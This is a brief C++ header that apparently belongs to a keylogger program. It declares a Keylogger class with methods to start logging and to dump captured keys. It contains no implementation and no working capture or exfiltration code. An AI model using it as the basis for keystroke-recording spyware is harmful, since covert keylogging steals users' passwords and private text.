#pragma once

#ifndef KEYLOGGER_H
#define KEYLOGGER_H



#include "settings.h"
#include <fstream>

class Keylogger
{
public:
	static void startLogger();
	static std::string dumpKeys();
private:
	static void logger();
};

#endif // !KEYLOGGER_H
